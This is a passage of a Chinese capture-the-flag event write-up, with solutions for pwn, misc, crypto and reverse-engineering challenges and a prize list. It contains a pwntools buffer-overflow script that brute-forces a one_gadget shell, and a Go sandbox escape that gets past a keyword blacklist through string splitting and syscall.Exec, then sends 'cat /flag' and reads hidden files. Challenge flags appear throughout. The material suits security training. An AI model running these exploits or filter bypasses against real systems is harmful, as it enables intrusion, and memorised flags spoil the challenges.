Pythonfrom pwn import *from LibcSearcher import *context.log_level = 'debug'elf=ELF("./pwn")one=0xe3b2epop_r12=0x401176pop_r15=0x401179ret=0x401016yes=0x401150while 1:   io=remote('pwn.challenge.ctf.show',28264)   #io=process("./pwn")   io.send(b'a'*0x20+b'b'*8+p64(pop_r12)+p64(0)+p64(yes))   sleep(0.01)   io.send(b'a'*0x20+b'c'*8+p64(pop_r15)+p64(0)+p64(yes))   sleep(0.01)   #使r12，r15归零，满足one_gadget条件   for i in range(15):      io.send(b'a'*0x20+b'd'*8+p64(yes))      sleep(0.01)   #不断抬栈，直到rbp的下一位可以利用   io.send(b'a'*0x20+b'd'*8+b'\x2e\x3b\x0e')#爆破one_gadget   try:      io.sendline('echo sess')      if b'sess'in io.recv(1024):         io.interactive()   except Exception:      io.close()      continue
pwn6 ESCAPE GO BOX
题目名称 ESCAPE GO BOX
出题人 shenghuo2
分值 400分
经过fuzz，可以知道过滤的关键字有
Pythonblacklist = ['sh','flag','fmt','io','log','server','cat','read','Read','os','exec','Print']
最短的exp可以是
看起来好像是不能用os和os下的os/exec
出题人的预期解是用的syscall库下的Exec方法
https://pkg.go.dev/syscall#Exec
func Exec ¶
Plain Textfunc Exec(argv0 string, argv []string, envv []string) (err error)
"s"+"h"，简单的拼接        构造sh可以得到交互式终端
也可以不用sh，慢慢读
这样基本上就能达到150字符的限制以内了
再稍微加点pwn的小技巧，比如 $0 
可提供的最短exp为：
Gopackage main;import a "syscall";func main(){a.Exec("/bin/bas"+"h",[]string{"$0"},nil)}
长度86
base64编码后为116字符
期待选手的wp
exp
Pythonfrom pwn import *context.log_level = "debug"r = remote('192.168.123.172','9001')r.sendlineafter(b'input your base64ed code: ',b'cGFja2FnZSBtYWluCmltcG9ydCgic3lzY2FsbCIpCmZ1bmMgbWFpbigpewp4Oj1bXXN0cmluZ3sicyIgKyAiaCJ9CnN5c2NhbGwuRXhlYygiL2Jpbi9iYXMiKyJoIix4LHgpCn0=')print("wait 10 second")sleep(10)r.sendline(b'cat /flag')r.sendline(b'cat /home/ctf/.*')print(r.recv())r.interactive()
MISC 部分
misc1 以假换真
题目名称  以假换真
出题人 机气人师傅
分值 100分
题目描述 听说你精通C、C++、Java、C#、VB、HTML、Delphi、JavaScript、PHP等语言的拼写,熟练PhotoShop、Illustrator CS、CorelDraw、Flash CS、AutoCAD、Office等软件的卸载,掌握Windows Server、Unix、Lunix等操作系统的关机。以上内容本题都不考。
出题/解题思路
6.zip
winrar解压得到html，超链接与文件名不符（hedan.jpg和hetao.png），
文件头 => 快压解压（360压缩打开的是下一步中的压缩包） => 得到hetao.png
hetao.png
图片尾附加压缩包
压缩包
用hedan.jpg明文攻击得到baidu.png，c1e1943e
解压密码：密码不重要，明文攻击测试
baidu.png
图标是百度网盘，上传后得到flag图片(md5碰撞)
<!-- 题外话：图片baidu.png格式是jpg，改扩展名后注释中作者信息写的我的qq号 -->
flag
Plain Textflag{487d06fc-8f40-421d-b8d0-e84b2da50579}
misc2 CTF的一生如履薄冰
题目名称  CTF的一生如履薄冰
出题人 王八七七
题目描述 无
分值 200分
[CTF的一生如履薄冰writeup.pdf]
misc3 签到·又见童话镇
题目名称  签到·又见童话镇
出题人 萌新阿狸
题目描述 光有眼睛也许还不太够，需要一点点数学。
分值：300分
题目提示 
两秒一个字母，慢慢来，你可以的。
前面不清楚没关系，重播了三遍，总有能看清的。
为什么特效要用绿幕呢？
60帧一组提取，用绿色通道，做fft，然后调一下清晰度。可以得到类似下面的东西，邮电费眼睛，用力看还是能看出来的。
最终flag ctfshow{610ea30b-1a2b-4a20-93dc-c32985c3a7cb}
misc4 base-XX
题目名称  base-XX
出题人 Xuxuzi
分值 400分
题目描述 Just another base-XX decode challenge!
base的本质是进制，base-XX所以是-XX进制。页面文本和注释里各有一段编码，多开几个靶机可以发现页面上那段编码的字符集一直在变，但注释里那段一直在base64字符表范围内。按对应进制和常用字符表解码注释得到页面上那段base-XX编码时使用的字符表，再解码一次得到flag。exp供参考，不建议直接抄：
Pythonimport requests, html, libnum, io, zipfile, refrom string import *t = input('Input your challenge URL here: \n')b = [html.unescape(requests.get(t).text.splitlines()[i%2+5][(98-i)*2+3:-4]) for i in b'base'][:2]d = lambda a, b: libnum.n2s(sum(a.index(j) * (~len(a) + 1) ** i for i, j in enumerate(b[::-1])))tmp = zipfile.ZipFile(io.BytesIO(d(d(f'{ascii_uppercase}{ascii_lowercase}{digits}+/', b[-1]).decode().splitlines()[-1], b[0])))print(re.findall(r'ctfshow{.*}', tmp.read(tmp.filelist[0].filename).decode())[0])
misc5 the Cipher of B
题目名称  the Cipher of B
出题人 Bubuzi
分值 400分
题目描述 Just another docx stego challenge!
培根密码的最终密文形式并不是一堆A和B，而是采用两种不同字体书写的字符。
当然，本题还需要考虑到手写文本和电子文档在“字体”处理上的一些不同，以及使用哪一种加密对应表，以及三段密钥的排列顺序。因为是0解，剩下的部分留作课后练习。
另外，关于文本内容，搜索一下“Lorem ipsum”就能知道这是一种通常用于平面排版设计的“假文本”，不包含任何实际内容或意义（也不包含什么Lorem ipsum加密之类的东西，事实上我也不知道有没有这种加密），换言之没有必要关注中间这段文本的内容本身。
misc6 四国军棋_网线鲨鱼
题目名称  四国军棋_网线鲨鱼
出题人 ThTsOd
分值 500分
题目描述 套神玩四国军棋总是赢不了，于是使用网线鲨鱼看别人棋，完成附件中Misc1.py获取flag
找到布阵时的流量（服务器发送）
分析数据格式
537769746368456e642020202020202020202020 0a0c050a080803090b0a09040c030c07020206070b0b020106 000000000002000000
指令 SwitchEnd，阵型，座位号
统计棋子数量
军棋一行 5 个棋子，其中大本营一定是军旗，可以确定 01 是 旗
0A 0B 0C 有3个，对应最小的棋子，连 排 兵
02 特殊，同样是3个棋子，雷
04 05 只有1个，按照子力大小排，是 司 军
04 - 0C 分别对应 司军师旅团营连排兵
03 只有2个，对应 炸
加上行营，打印layout
PythonLayout=[bytes.fromhex(x) for x in '''0a0c050a080803090b0a09040c030c07020206070b0b020106060c040b09070a0a08060c0b030a03050708020c0201020b09040404040404040404040404040404040404040404040401040405080c06090a030c0a0b070a09030c020207060b0b020108'''.split()]C = "空旗雷炸司军师旅团营连排兵"for l in Layout:    count = 0    pos = 0    while(count < 25):        if(pos % 5 == 0):            print()        if(pos in [6,8,12,16,18]):            print("〇",end='')            pos += 1            continue        print(C[l[count]],end='')        count += 1        pos += 1    print()
接下来确定玩家位置
玩家顺序
布阵顺序对应 0 2 1 3
可知 Jack布阵0 , King布阵2, Queen布阵1, Joker布阵3
PythonPLAYER_JACK='''司军团兵师营〇连〇炸兵连〇排旅连〇营〇炸兵雷雷旅师排排雷旗团'''PLAYER_QUEEN='''连兵军连团团〇炸〇营排连〇营司兵〇炸〇兵旅雷雷师旅排排雷旗师'''PLAYER_KING='''师兵司排营旅〇连〇连团师〇兵排炸〇连〇炸军旅团雷兵雷旗雷排营'''PLAYER_JOKER='''司司司司司司〇司〇司司司〇司司司〇司〇司司司司司司司司司旗司'''
找到聊天记录
数之前的 MoveQz 数量即可（只统计服务器发送）
Python# 问题5：第1次发言内容，和此时的游戏步数NUMBER1 = 26MSG1 = "My Neuro is CUTTTE!!!"# 问题6：第2次发言内容，和此时的游戏步数NUMBER2 = 42MSG2 = "You Should watch twitch.tv/vedal987 to cure your depression"
ctfshow{ICatchYouCheatingAll40InYourLayoutByPacketCapture!FR1Ck}
CRYPTO 部分
crypto1 月月的爱情故事
题目名称  月月的爱情故事
出题人 mumu666
题目描述 无
分值 100分
[月月的爱情故事.pdf]
crypto2 麻辣兔头又一锅
题目名称  麻辣兔头又一锅
出题人 萌新阿狸
题目描述 听说有人不喜欢短尾巴的兔兔？肿么可能？我也很疑惑呢。
分值 200分
Pythonimport gmpy2 with open('z:/flag.txt','r') as f:    txt = f.readlines()    c = eval(f'[{txt[0]}],[{txt[1]}]')for i in range(len(c1)):    print(chr((gmpy2.fib(c[0][i])^gmpy2.fib(c[1][i]))&0xff),end='' )
最终flag ctfshow{6d83b2f1-1241-4b25-9c1c-0a4c218f6c5f}
crypto3 NOeasyRSA
题目名称  NOeasyRSA
出题人 mumu666
题目描述 Can you find a and b?
分值 200分
[NOeasyRSA.pdf]
crypto4 sign_rand
题目名称  sign_rand
出题人 lingfeng
题目描述 无
分值 300分
类似于黑盒测试，选择明文攻击
Python# !/usr/bin/env python3.10# -*- coding: utf-8 -*-# @File    : exp.pyfrom Crypto.Util.number import *from hashlib import md5from sage.all import *from random import Randomdef buildT():    rng = Random()    T = matrix(GF(2), 32, 32)    for i in range(32):        s = [0] * 624        s[0] = 1 << (31 - i)        rng.setstate((3, tuple(s + [0]), None))        tmp = rng.getrandbits(32)        row = vector(GF(2), [int(x) for x in bin(tmp)[2:].zfill(32)])        T[i] = row    return Tdef get_key(key1):    T = buildT()    a = [int(i) for i in bin(key1)[2:].zfill(32)]    a = matrix(GF(2), a)    b = T.solve_left(a)    c = ''.join([str(i) for i in b.list()])    return (int(c, 2))gift, enc = # kbits = gift[0][1].bit_length()def inv_sbox(s_box):    inv = []    for i in range(max(s_box)):        if i in s_box:            inv.append(s_box.index(i))        else:            inv.append('?')    return invdef dec_flag(enc, key):    key = bytes_to_long(md5(long_to_bytes(key)).digest())    dec = enc ^ key    return long_to_bytes(dec)s_box = inv_sbox(gift[1])data = gift[0][(s_box[gift[2] // 2])]key1 = (data & 0xffffffff)key = get_key(key1)print(dec_flag(enc, key))# flag=b'ctfshow{F2AD971D-66C2-2D1D-69D6-CE7DE2A49B35}'
crypto5 哪位师傅知道这个是什么密码啊？
题目名称  哪位师傅知道这个是什么密码啊？
出题人 春哥
题目描述 为什么我运行了加密不出结果啊？为什么啊？啊？
分值 400分
Pythonimport osimport sysfrom Crypto.Util.number import *def pr(x):    sys.stdout.write(f'{x}\n')    sys.stdout.flush()def get_factorial_list(p):    factorial_list = [1] * p    for i in range(1, p):        factorial_list[i] = factorial_list[i-1] * i % p    return factorial_listdef G(x, y, p, factorial_list):    x1, x2 = x // p, x % p    y1, y2 = y // p, y % p    # print(f'{x = }, {y = }')    # print(f'{x2 = }, {y2 = }')    if (x2 < y2):        cur_G = 0    else:        cur_G = factorial_list[x2] * inverse(factorial_list[y2], p) * inverse(factorial_list[x2-y2], p) % p    # print(f'{cur_G = }')    if (x1 == 0) and (y1 == 0):        return cur_G    else:        return G(x1, y1, p, factorial_list) * cur_G % pdef get_keys(n: int):    p = getPrime(-11+45-14)    factorial_list = get_factorial_list(p)    pr('Please wait...')    s_list, t_list, u_list = [], [], []    for i in range(n):        pr(f'Progress: {i+1} / {n}')        while True:            t, s = sorted(getPrime(101) for _ in 'NB')            u = G(s, t, p, factorial_list) & 0xFF            if (u != 0):                s_list.append(s)                t_list.append(t)                u_list.append(u)                break    return (s_list, t_list, p), u_list FLAG = os.getenv('FLAG', 'ctfshow{never_gonna_give_you_flag}')pubkey, privkey = get_keys(len(FLAG))ciphertext = bytes(x ^ k for x, k in zip(FLAG.encode(), privkey))pr(f'{pubkey = }')pr(f'{ciphertext.hex() = }')# def test(n, m, p):#     factorial_list = [1] * (n+1)#     pow_list = [0] * (n+1)#     for i in range(1, n+1):#         cur_pow = 0#         t = i#         while (t % p == 0):#             cur_pow += 1#             t //= p#         factorial_list[i] = factorial_list[i-1] * t % p#         pow_list[i] = pow_list[i-1] + cur_pow#     if (pow_list[n] > pow_list[m] + pow_list[n-m]):#         print(f'{pow_list[n] = }')#         print(f'{pow_list[m] = }')#         print(f'{pow_list[n-m] = }')#         return 0#     else:#         return (factorial_list[n] * inverse(factorial_list[m], p) * inverse(factorial_list[n-m], p) % p)# p = getPrime(7)# n = getPrime(20)# m = getPrime(19)# if (n < m):#     n, m = m, n# c = test(n, m, p)# print(f'{n = }, {m = }, {p = }')# print(f'{c = }')# factorial_list = get_factorial_list(p)# print(f'{G(n, m, p, factorial_list) = }')
RE 部分
re1 re_signin
题目名称  re_signin
出题人 h1xa
题目描述 最简单的签单
分值 100分
最终flag ctfshow{happy_2024_jiayou_a}
exp
C++#include <stdio.h>#include <stdlib.h>#include <string.h>#define KEY 2024#define CTFSHOW2024 0x36Dunsigned int generate_key(unsigned int s) {  s = s * 0x5bd1e995 + 0x12345678;  return (s >> 16) & 0xffff;}void decrypt(unsigned char *plaintext, unsigned char *ciphertext, unsigned int key1, unsigned int key2) {  unsigned int sum = 0;  int i;  for (i = 0; i < 128; i++) {    if(ciphertext[i]==0){      continue;    }    sum += key1;    sum += key2;    plaintext[i] = ciphertext[i]  - sum;    sum = (sum >> 4) ^ ciphertext[i];  }}int main() {  unsigned char plaintext[128]={0};  unsigned char ciphertext[128]={0};  unsigned int number;  unsigned char code[] = {  0x9c, 0xcc, 0x88, 0x76, 0xd7, 0x89, 0x78, 0xec, 0x7c, 0xd7, 0x89, 0x71, 0xe3, 0x6d, 0x98, 0x17,  0x94, 0x0f, 0xca, 0x9f, 0x7e, 0xd9, 0xa0, 0x8a, 0x79, 0xd1, 0x80, 0x77, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  };  number = generate_key(CTFSHOW2024);  decrypt(plaintext, code, KEY, number);  printf("%s",plaintext);}
re2 cpp
题目名称  cpp
出题人 ThTsOd
分值 300分
题目描述 Let's meet the Chinese Program Language.
最终flag ctfshow{Oh!Y0uUndEr5t4nD7he14nguaGeN0W!}
题目代码，如果算的话
Python#包括 <芯片组>#包括 <cstdlib>#包括 <字符串>#包括 <细绳>#包括 <切尔诺>#包括 <输出流>#包括 <向量>类型定义 无符号短整型 相同;#定义 萬 * 10000 +#定义 仟 * 1000 +#定义 佰 * 100 +#定义 拾 * 10 +#定义 壹 1#定义 贰 2#定义 叁 3#定义 肆 4#定义 伍 5#定义 陆 6#定义 柒 7#定义 捌 8#定义 玖 9#定义 零 0结构群{    相同 和平, 爱, 邮件[65536];};使用命名空间 标准；班级 超级加密{私人的:    一群 健身袋;    细绳 钥匙;    相同 超数;民众：    空白 煤气灯(常量 字符 *神经, 相同 邪恶的)    {        这->钥匙 = 细绳(神经);        这->超数 = 邪恶的;    }    空白 加密A计划(向量<相同> &清楚的)    {        整数 长度 = 钥匙.长度();        整数 我, 你, 他, 她;        相同 *邮件;        健身袋.和平 = 0;        健身袋.爱 = 0;        邮件 = 健身袋.邮件;        为了 (我 = 0; 我 < 65536; 我++)        {            邮件[我] = 我;        }        你 = 他 = 0;        为了 (我 = 0; 我 < 65536; 我++)        {            她 = 邮件[我];            你 = (相同)(你 + 她 + 钥匙[他]);            邮件[我] = 邮件[你];            邮件[你] = 她;            如果 (++他 >= 长度)                他 = 0;        }    }    空白 加密B计划(向量<相同> &清楚的)    {        整数 我, 和平, 爱, 她, 它;        相同 *邮件;        和平 = 健身袋.和平;        爱 = 健身袋.爱;        邮件 = 健身袋.邮件;        尺寸_t 长度 = 清楚的.尺寸();        为了 (我 = 0; 我 < 长度; 我++)        {            和平 = (相同)(和平 + 1);            她 = 邮件[和平];            爱 = (相同)(爱 + 她);            邮件[和平] = 它 = 邮件[爱];            邮件[爱] = 她;            清楚的.在(我) += 邮件[(相同)(她 + 它)];        }        健身袋.和平 = 和平;        健身袋.爱 = 爱;    }    空白 加密C计划(向量<相同> &清楚的)    {        尺寸_t 长度 = 清楚的.尺寸();        为了 (整数 我 = 0; 我 < 长度; 我++)        {            相同 资源 = 0;            相同 她 = 清楚的.在(我);            相同 它 = 这->超数;            尽管 (它)            {                如果 (它 & 1)                    资源 = (资源 + 她);                她 = (她 + 她);                它 = 它 / 2;            }            清楚的.在(我) = 资源;        }    }};常量 相同 回答[] = {    壹 萬 叁 仟 陆 佰 陆 拾 捌,    壹 萬 肆 仟 陆 佰 肆 拾 肆,    贰 萬 柒 仟 捌 佰 贰 拾 叁,    柒 仟 壹 佰 壹 拾 贰,    陆 萬 叁 仟 零 佰 叁 拾 肆,    肆 仟 贰 佰 陆 拾 玖,    陆 萬 肆 仟 捌 佰 玖 拾 柒,    肆 萬 壹 仟 零 佰 零 拾 肆,    叁 萬 伍 仟 捌 佰 陆 拾 肆,    壹 萬 肆 仟 肆 佰 肆 拾 柒,    叁 萬 玖 仟 贰 佰 肆 拾 壹,    伍 萬 柒 仟 叁 佰 捌 拾 陆,    壹 萬 陆 仟 柒 佰 贰 拾 叁,    捌 仟 零 佰 陆 拾 捌,    贰 萬 柒 仟 零 佰 壹 拾 贰,    肆 萬 壹 仟 贰 佰 捌 拾 玖,    壹 萬 玖 仟 伍 佰 贰 拾 陆,    肆 萬 玖 仟 玖 佰 叁 拾 柒,    叁 萬 叁 仟 零 佰 陆 拾 肆,    伍 萬 捌 仟 贰 佰 柒 拾 伍    };常量字符错误[] = {     埃德斯塔地址请求，     经济拒绝，     欧克林，     易诺联，     EAFNO支持，     超时，     EILSEQ，     已经准备好了，     EAFNO支持，     超时，     进展顺利，     关闭，     EAFNO支持，     埃斯塔莱，     ENETUNREACH，     埃多多特，     埃斯塔莱，     益登，     0};整型主(){    字符串输入标志；    库特 << "在此输入您的标志：" << 恩德尔;    辛 >> 输入标志;    相同 格式化标志[64] = {0};    内存复制(格式化标志, 输入标志.c_str(), 输入标志.尺寸());    向量<相同> 普通旗帜;    整数计数=0；    而（真）    {        如果 (格式化标志[数数] == 0)        {            休息;        }        普通旗帜.push_back(格式化标志[数数]);        数数 += 1;    }    超级加密 牛肉;    牛肉.煤气灯(错误, 0x1337);    牛肉.加密A计划(普通旗帜);    牛肉.加密B计划(普通旗帜);    牛肉.加密C计划(普通旗帜);    尝试    {        为了 (整数 我 = 0; 我 < 最大限度(普通旗帜.尺寸(), 大小(回答) / 大小(回答[0])); 我++)        {            如果 (普通旗帜.在(我) != 回答[我])            {                扔 运行时错误("错误的答案");            }        }    }    捕获（例外 这是）    {        库特 << "检查失败！" << 恩德尔;        出口(退出失败);    }    库特 << "检查已接受！" << 恩德尔;    出口(退出_成功);}
翻译后得到源码
C++#include <cstdio>#include <cstdlib>#include <cstring>#include <string>#include <cerrno>#include <iostream>#include <vector>typedef unsigned short Sama;#define 萬 * 10000 +#define 仟 * 1000 +#define 佰 * 100 +#define 拾 * 10 +#define 壹 1#define 贰 2#define 叁 3#define 肆 4#define 伍 5#define 陆 6#define 柒 7#define 捌 8#define 玖 9#define 零 0struct Swarm{    Sama Peace, Love, Mail[65536];};using namespace std;class superEncrypt{private:    Swarm Gymbag;    string key;    Sama superNumber;public:    void Gaslight(const char *Neuro, Sama Evil)    {        this->key = string(Neuro);        this->superNumber = Evil;    }    void encryptPlanA(vector<Sama> &plain)    {        int length = key.length();        int me, you, he, she;        Sama *Mail;        Gymbag.Peace = 0;        Gymbag.Love = 0;        Mail = Gymbag.Mail;        for (me = 0; me < 65536; me++)        {            Mail[me] = me;        }        you = he = 0;        for (me = 0; me < 65536; me++)        {            she = Mail[me];            you = (Sama)(you + she + key[he]);            Mail[me] = Mail[you];            Mail[you] = she;            if (++he >= length)                he = 0;        }    }    void encryptPlanB(vector<Sama> &plain)    {        int me, Peace, Love, she, it;        Sama *Mail;        Peace = Gymbag.Peace;        Love = Gymbag.Love;        Mail = Gymbag.Mail;        size_t length = plain.size();        for (me = 0; me < length; me++)        {            Peace = (Sama)(Peace + 1);            she = Mail[Peace];            Love = (Sama)(Love + she);            Mail[Peace] = it = Mail[Love];            Mail[Love] = she;            plain.at(me) += Mail[(Sama)(she + it)];        }        Gymbag.Peace = Peace;        Gymbag.Love = Love;    }    void encryptPlanC(vector<Sama> &plain)    {        size_t length = plain.size();        for (int me = 0; me < length; me++)        {            Sama res = 0;            Sama she = plain.at(me);            Sama it = this->superNumber;            while (it)            {                if (it & 1)                    res = (res + she);                she = (she + she);                it = it / 2;            }            plain.at(me) = res;        }    }};// KEY YouCanTranslateIt!// MUL 0x1337// FLAG ctfshow{Oh!Y0uUndEr5t4nD7he14nguaGeN0W!}/*ctfshow{Oh!Y0uUndEr5t4nD7he14nguaGeN0W!}*/const Sama ANSWER[] = {    壹 萬 叁 仟 陆 佰 陆 拾 捌,    壹 萬 肆 仟 陆 佰 肆 拾 肆,    贰 萬 柒 仟 捌 佰 贰 拾 叁,    柒 仟 壹 佰 壹 拾 贰,    陆 萬 叁 仟 零 佰 叁 拾 肆,    肆 仟 贰 佰 陆 拾 玖,    陆 萬 肆 仟 捌 佰 玖 拾 柒,    肆 萬 壹 仟 零 佰 零 拾 肆,    叁 萬 伍 仟 捌 佰 陆 拾 肆,    壹 萬 肆 仟 肆 佰 肆 拾 柒,    叁 萬 玖 仟 贰 佰 肆 拾 壹,    伍 萬 柒 仟 叁 佰 捌 拾 陆,    壹 萬 陆 仟 柒 佰 贰 拾 叁,    捌 仟 零 佰 陆 拾 捌,    贰 萬 柒 仟 零 佰 壹 拾 贰,    肆 萬 壹 仟 贰 佰 捌 拾 玖,    壹 萬 玖 仟 伍 佰 贰 拾 陆,    肆 萬 玖 仟 玖 佰 叁 拾 柒,    叁 萬 叁 仟 零 佰 陆 拾 肆,    伍 萬 捌 仟 贰 佰 柒 拾 伍    };const char ERROR[] = {    EDESTADDRREQ,    ECONNREFUbeefD,    EUCLEAN,    ENOLINK,    EAFNOSUPPORT,    ETIMEDOUT,    EILbeefQ,    EALREADY,    EAFNOSUPPORT,    ETIMEDOUT,    EINPROGRESS,    ESHUTDOWN,    EAFNOSUPPORT,    ESTALE,    ENETUNREACH,    EDOTDOT,    ESTALE,    EDOM,    0};int main(){    string InputFlag;    cout << "Input Your Flag Here:" << endl;    cin >> InputFlag;    Sama FormatedFlag[64] = {0};    memcpy(FormatedFlag, InputFlag.c_str(), InputFlag.size());    vector<Sama> PlainFlag;    int count = 0;    while (true)    {        if (FormatedFlag[count] == 0)        {            break;        }        PlainFlag.push_back(FormatedFlag[count]);        count += 1;    }    superEncrypt beef;    beef.Gaslight(ERROR, 0x1337);    beef.encryptPlanA(PlainFlag);    beef.encryptPlanB(PlainFlag);    beef.encryptPlanC(PlainFlag);    try    {        for (int i = 0; i < max(PlainFlag.size(), sizeof(ANSWER) / sizeof(ANSWER[0])); i++)        {            if (PlainFlag.at(i) != ANSWER[i])            {                throw runtime_error("Wrong Answer");            }        }    }    catch (exception e)    {        cout << "Check Failed!" << endl;        exit(EXIT_FAILURE);    }    cout << "Check Accepted!" << endl;    exit(EXIT_SUCCESS);}
exp
Pythonclass RC4:     def __init__(self,key):          '''unit tests'''          if key == "":            raise ValueError("key can not be empyt")        if not isinstance(key, str):            raise TypeError("key must be of type String")          #generator        self.keygenerator =  self.PRGA_YIELD( self.KSA(list(key.encode())))    #returns state array S    def KSA(self,key):        s = list(range(0,65536))#internal state, array [0 - 255]         j = 0        for i in range(65536):            j = (j+s[i]+key[i%len(key)])% 65536            s[i],s[j] = s[j],s[i] #list swap        return s    #returns keystream generator K    def PRGA_YIELD(self,S):        i,j = 0,0        while True:            i = (i + 1) % 65536            j = (j + S[i]) % 65536            S[i], S[j] = S[j], S[i]  # swap            K = S[(S[i] + S[j]) % 65536]            yield K# Test vectors  https://en.wikipedia.org/wiki/RC4 :#example:import struct FArray = [13668, 14644, 27823, 7112, 63034, 4269, 64897, 41004, 35864, 14447, 39241, 57386, 16723, 8068, 27012, 41289, 19526, 49937, 33064, 58275] keygenerator = RC4("YouCanTranslateIt!").keygeneratorfor c in range(len(FArray)):    FArray[c] = FArray[c] * pow(0x1337,-1,0x10000)    FArray[c] = (-next(keygenerator) + FArray[c]) & 0xffffANS = [struct.pack("<H",FArray[i]) for i in range(len(FArray))]print(b''.join(ANS))'''cppLet's meet the Chinese Program Language.ctfshow{Oh!Y0uUndEr5t4nD7he14nguaGeN0W!}'''
re3 四国军棋_套神注册码
题目名称  四国军棋_套神注册码
出题人 ThTsOd
分值 500分
题目描述 套神发现四国军棋下180步就强制和棋，网上找注册码发现没有，于是研究了下这个程序的注册算法，并且觉得改跳转绕过注册太low了，决定输入自己指定的注册码（keys.txt)才能注册程序,完成附件中Re1.py获取flag
[aimethod.bin]
Pythonimport hashlibfrom Crypto.Cipher import AES# 脚本需要放到 四国争霸 目录下运行# 问题1：你应该修改一个外部文件(不需要./开头，直接是文件名字)FILENAME = "aimethod.bin".lower()# 问题2：修改后文件的HASH(自动运算，无需填写)# 问题3：需要给 四国争霸.exe 打一个 32字节的Patch，找到文件修改位置，Patch内容为 32个 0-9a-f 字符 OFFSET = 0x1a2183PATCH = "cf54e9dc4e6b2fb5631532da37397a2e"assert(len(PATCH) == 32)# ---- ANSWER SHEET OVER ------DATA = open(FILENAME,"rb").read()FILEHASH = hashlib.blake2b(DATA).digest()HASH1 = hashlib.blake2b(FILENAME.encode()).digest()HASH2 = FILEHASHassert(type(OFFSET) == type(-1) )HASH31 = hashlib.blake2b(str(OFFSET).encode()).digest()HASH32 = hashlib.blake2b(bytes.fromhex(PATCH)).digest()D = hashlib.blake2b(HASH1 + HASH2 + HASH31 + HASH32).digest()KEY = D[0:16]IV = D[16:32]cipher = AES.new(KEY,AES.MODE_GCM,IV)C = bytes.fromhex("592fa928073d95ffddeb59c7d58ea07d7e5316bf4f13a1c1171e2f39bd30206b733556908536fb62247af210ff5e6a4efa95b104abb9147cdbd172ca40d5467b5cb16c2829cb47d94b58d6c2c1316db1")H = bytes.fromhex("77a251b38f82ee953d07638565529468")FLAG = cipher.decrypt_and_verify(C,H)print(FLAG.decode())#FLAG = b"ctfshow{RegisterWithYourOWNCODE!You_never_M33t_the_newfangled_Rev3rse_Challenge}"
获奖名单
获奖榜单
本次比赛结束后，排名前5位和第66位的师傅名单如下，恭喜师傅们！
请联系ctfshow-h1xa（QQ 447685307）领奖
排名
ID
积分
比赛奖励
1
TNT=_=
2600
现金2000元
2
JureGrinffin
2500
现金200元
3
gxngxngxn
1900
现金200元
4
hotwoe
1800
现金200元
5
chuwei
1700
现金200元
66
Arcueid
200
现金66元
已兑奖
完整榜单
点击图片可查看完整电子表格
致谢
48小时的比赛很快就结束了，希望本次比赛师傅们玩的开心！
再次感谢为了本次比赛辛苦出题的师傅们，为本次比赛提供了高质量的题目，谢谢你们！
以下为本次比赛题目出题人名单(排名不分先后)
方向
题目名称
出题人
web
easy_include
h1xa
easy_web
chu0
孤注一掷
h1xa
easy_login
h1xa
easy_api
h1xa
pwn
Badboy
Zz_Zz
s.s.a.l
Zz_Zz
Happy_New_Year
bit
Heap_Harmony_Festivity
bit
yes_or_no
久而不念
ESCAPE GO BOX
shenghuo2
misc
以假乱真
机气人师傅
CTF的一生如履薄冰
王八七七
签到·又见童话镇
萌新阿狸
base-XX
Xuxuzi
the Cipher of B
Bubuzi
四国军棋_网线鲨鱼
ThTsOd
四国军棋_注册码私货
ThTsOd
crypto
月月的爱情故事
mumu666
麻辣兔头又一锅
萌新阿狸
NOeasyRSA
mumu666
sign_rand
lingfeng
哪位师傅知道这个是什么密码啊?
春哥
re
re_signin
h1xa
cpp
ThTsOd
四国军棋_套神注册码
ThTsOd
CTFshow全体祝愿师傅们 新年快乐，阖家幸福！
我们下次比赛再见！
